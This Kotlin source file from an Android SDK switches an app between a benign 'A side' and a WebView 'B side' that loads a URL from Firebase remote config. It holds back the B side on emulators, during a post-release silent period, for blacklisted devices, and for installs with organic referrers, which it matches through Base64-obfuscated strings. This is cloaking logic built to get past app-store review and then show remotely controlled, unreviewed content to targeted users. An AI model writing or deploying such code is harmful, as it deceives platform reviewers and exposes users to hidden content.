package poetry.sdk.firebase

import android.annotation.SuppressLint
import android.content.Context
import android.text.TextUtils
import android.util.Base64
import android.webkit.URLUtil
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.flow.FlowCollector
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import kotlinx.coroutines.flow.onCompletion
import kotlinx.coroutines.flow.onStart
import kotlinx.coroutines.launch
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import org.greenrobot.eventbus.ThreadMode
import poetry.sdk.core.InitInspector
import poetry.sdk.core.VestCore
import poetry.sdk.core.VestInspectCallback
import poetry.sdk.core.VestInspectResult
import poetry.sdk.core.domain.SDKEvent
import poetry.sdk.core.manager.AdjustManager
import poetry.sdk.core.manager.InstallReferrerManager
import poetry.sdk.core.util.ConfigPreference
import poetry.sdk.core.util.DeviceUtil
import poetry.sdk.core.util.GoogleAdIdInitializer
import poetry.sdk.core.util.PackageUtil
import poetry.sdk.core.util.PreferenceUtil
import poetry.util.ImitateChecker
import poetry.util.LogUtil
import java.net.URLDecoder
import java.util.concurrent.TimeUnit

class VestFirebase private constructor() {
    var TAG = VestFirebase::class.java.simpleName
    var mVestInspectCallback: VestInspectCallback? = null
    var mJob: Job? = null
    var mContext: Context? = null

    init {
        if (!EventBus.getDefault().isRegistered(this)) {
            EventBus.getDefault().register(this)
        }
    }

    private object InstanceHolder {
        val INSTANCE = VestFirebase()
    }

    companion object {
        private val TAG = VestFirebase::class.java.simpleName

        @JvmStatic
        fun getInstance(): VestFirebase {
            return InstanceHolder.INSTANCE
        }
    }

    /**
     * setup duration of silent period for requesting A/B switching starting from the date of apk build
     *
     * @param time     duration of time
     * @param timeUnit time unit for example DAYS, HOURS, MINUTES, SECONDS
     */
    fun setInspectDelayTime(time: Long, timeUnit: TimeUnit): VestFirebase {
        val timeMills = timeUnit.toMillis(time)
        PreferenceUtil.saveInspectDelay(timeMills)
        return this
    }

    /**
     * set up a device whitelist for Firebase, where devices in the whitelist can bypass the interception of Install Referrer in the Release environment
     *
     * @param deviceList Obtain the device ID of your current device by filtering "getDeviceId: DeviceId:" in Logcat
     */
    fun setFirebaseDeviceWhiteList(deviceList: List<String>) {
        if (deviceList.isEmpty()) return
        val whiteFirebaseDeviceListInCache =
            ConfigPreference.readStringList(ConfigPreference.CONFIG_FIREBASE_WHITE_DEVICE) + deviceList
        ConfigPreference.saveStringList(
            whiteFirebaseDeviceListInCache, ConfigPreference.CONFIG_FIREBASE_WHITE_DEVICE
        )
    }

    /**
     * setup the date of apk build
     *
     * @param releaseTime time format：yyyy-MM-dd HH:mm:ss
     */
    fun setReleaseTime(releaseTime: String?): VestFirebase {
        PreferenceUtil.saveReleaseTime(releaseTime)
        return this
    }


    /**
     * trying to request A/B switching, fetch config from firebase server
     *
     * @param context
     * @param vestInspectCallback
     */
    fun inspect(context: Context?, vestInspectCallback: VestInspectCallback?): VestFirebase {
        mContext = context
        mVestInspectCallback = vestInspectCallback
        init()
        inspect()
        return this
    }

    private fun init() {
        //子品牌为空则使用父品牌（来自config配置）
        val childBrd = PackageUtil.getChildBrand()
        if (childBrd.isNullOrEmpty()) {
            PreferenceUtil.saveChildBrand(PackageUtil.getParentBrand())
        }
    }

    private fun inspect() {
        mJob = MainScope().launch {
            AdjustManager.trackEventStart(null)
            flow {
                if (!canInspect()) {
                    emit("")
                    return@flow
                }
                fetchRemoteFirebase(this)
            }.flowOn(Dispatchers.IO).catch {
                LogUtil.e(TAG, it, "[Vest-Firebase] onInspect error")
                if (mVestInspectCallback != null) {
                    mVestInspectCallback?.onShowASide(VestInspectResult.REASON_FIREBASE_ERROR)
                }
            }.onStart {
                LogUtil.d(TAG, "[Vest-Firebase] onInspect start")
            }.onCompletion {
                LogUtil.d(TAG, "[Vest-Firebase] onInspect finish")
            }.collect {
                LogUtil.d(TAG, "[Vest-Firebase] onInspectTarget: $it")
                val url = it
                if (mVestInspectCallback != null) {
                    if (url.isEmpty()) {
                        mVestInspectCallback?.onShowASide(VestInspectResult.REASON_OFF_ON_SERVER)
                    } else {
                        val launchBSuccess = VestCore.toWebViewActivity(
                            mContext, url, VestCore.WEBVIEW_TYPE_INNER
                        )
                        mVestInspectCallback?.onShowBSide(url, launchBSuccess)
                    }
                }
            }
        }
    }

    private suspend fun fetchRemoteFirebase(flowCollector: FlowCollector<String>) {
        val remoteSourceFirebase = RemoteSourceFirebase { success, remoteConfig ->
            //上报事件
            AdjustManager.trackEventGreeting(null)

            if (checkFirebaseBlacklist(remoteConfig, flowCollector)) return@RemoteSourceFirebase

            var url = ""
            if (success) {
                LogUtil.dT(
                    TAG,
                    "[Vest-Firebase] fetch remote config success: " + remoteConfig.toString(),
                    true
                )
                url = remoteConfig?.l ?: ""
            } else {
                LogUtil.d(TAG, "[Vest-Firebase] fetch remote config fail")
            }

            //链接无效||开关关闭，直接走缓存
            if (!URLUtil.isValidUrl(url) || remoteConfig?.s == false) {
                val cachedUrl = PreferenceUtil.readFirebaseUrl()
                if (!cachedUrl.isNullOrEmpty()) {
                    url = cachedUrl
                } else {
                    url = ""
                }
            } else {
                //开关开启且链接有效
                PreferenceUtil.saveFirebaseUrl(url)

                PreferenceUtil.saveTargetCountry(remoteConfig!!.c)
                PreferenceUtil.saveChildBrand(remoteConfig.b)
            }

            if (URLUtil.isValidUrl(url)) {
                VestCore.updateThirdSDK()
            }

            flowCollector.emit(url)
        }
        remoteSourceFirebase.fetch()
    }

    private suspend fun checkFirebaseBlacklist(
        remoteConfig: RemoteConfig?, flowCollector: FlowCollector<String>
    ): Boolean {
        if (remoteConfig?.bl?.trim()?.isNotEmpty() == true) {
            val firebaseBlackList = remoteConfig.bl!!.split(",")
            if (firebaseBlackList.isNotEmpty()) {
                val deviceId = DeviceUtil.getDeviceID()
                val inFirebaseWhiteList = firebaseBlackList.find { it == deviceId }.isNullOrEmpty()
                if (!inFirebaseWhiteList) {
                    LogUtil.d(
                        TAG, "[Vest-Firebase] intercepted by firebase blacklist", true
                    )
                    flowCollector.emit("")
                    return true
                }
            }
        }
        return false
    }

    @SuppressLint("SimpleDateFormat")
    private fun canInspect(): Boolean {
        //模拟器，直接跳A
        if (ImitateChecker.isImitate()) {
            LogUtil.dT(TAG, "[Vest-Firebase] inspect cancel, it's emulator", true)
            return false
        }

        //静默期未到，直接跳A
        val inspectStartTime = PreferenceUtil.getReleaseTime()
        val inspectDelay = PreferenceUtil.getInspectDelay()
        if (inspectStartTime > 0 && inspectDelay > 0) {
            //获取最终静默截止时间
            val inspectTimeMills = inspectStartTime + inspectDelay
            LogUtil.dT(
                TAG,
                "[Vest-Firebase] inspect time result:${System.currentTimeMillis() >= inspectTimeMills}",
                true
            )
            if (System.currentTimeMillis() < inspectTimeMills) return false
        }
        val aid = DeviceUtil.getDeviceID()
        //判断本地黑名单
        val blackDeviceList = ConfigPreference.readStringList(ConfigPreference.CONFIG_BLACK_DEVICE)
        val isInBlackList = blackDeviceList.find { it == aid } != null
        if (isInBlackList) {
            LogUtil.dT(
                TAG,
                "[Vest-Firebase] current device is in local blackList:${aid}",
                true
            )
            return false
        }

        var installReferrer = InstallReferrerManager.getInstallReferrer()
        if (TextUtils.isEmpty(installReferrer) || InstallReferrerManager.INSTALL_REFERRER_UNKNOWN == installReferrer) {
            InstallReferrerManager.initInstallReferrer()
        }
        GoogleAdIdInitializer.init()

        val inspected = InitInspector().inspect()

        val whiteDeviceList =
            ConfigPreference.readStringList(ConfigPreference.CONFIG_FIREBASE_WHITE_DEVICE)
        val isInWhiteList = whiteDeviceList.find { it == aid } != null
        LogUtil.d(TAG, "[Vest-Firebase] current device is in white list:${isInWhiteList}")
        //白名单中设备跳过归因检测
        if (!isInWhiteList) {
            //本地判断自然量
            installReferrer = InstallReferrerManager.getInstallReferrer()
            val organicIR = arrayOf(
                "dW5rbm93bg==",
                "VU5LTk9XTg==",
                "dXRtX3NvdXJjZSUzRCUyOG5vdDIwJTI1c2V0JTI5JTI2dXRtX21lZGl1bSUzRCUyOG5vdDIwJTI1c2V0JTI5",
                "dXRtX21lZGl1bSUzRG9yZ2FuaWM="
            )
            val isOrganic = organicIR.find {
                installReferrer!!.contains(it.run {
                    val decodedB64String = String(Base64.decode(this, Base64.DEFAULT))
                    //转换被encode的符号
                    val decodedString = URLDecoder.decode(decodedB64String, "UTF-8")
                    LogUtil.d(TAG, "[Vest-Firebase] decoded ir for match:%s",decodedString)
                    decodedString
                })
            } != null
            if (isOrganic) {
                LogUtil.dT(TAG, "[Vest-Firebase] install referrer is organic!", true)
                return false
            }
        }
        return inspected
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    fun onReceiveEvent(sdkEvent: SDKEvent) {
        when (sdkEvent.event) {
            "onCreate" -> onCreate()
            "onPause" -> onPause()
            "onResume" -> onResume()
            "onDestroy" -> onDestroy()
            else -> {}
        }
    }

    private fun onCreate() {
        LogUtil.d(TAG, "[Vest-Firebase] onCreate")
    }

    private fun onPause() {
        LogUtil.d(TAG, "[Vest-Firebase] onPause")
        if (mJob != null) {
            if (mJob?.isActive!!) {
                LogUtil.d(TAG, "[Vest-Firebase] inspect job is active, cancel now")
                mJob?.cancel()
            } else {
                LogUtil.d(TAG, "[Vest-Firebase] inspect job is not active")
            }
        } else {
            LogUtil.d(TAG, "[Vest-Firebase] inspect job is null")
        }
    }

    private fun onResume() {
        LogUtil.d(TAG, "[Vest-Firebase] onResume")
    }

    private fun onDestroy() {
        LogUtil.d(TAG, "[Vest-Firebase] onDestroy")
    }

}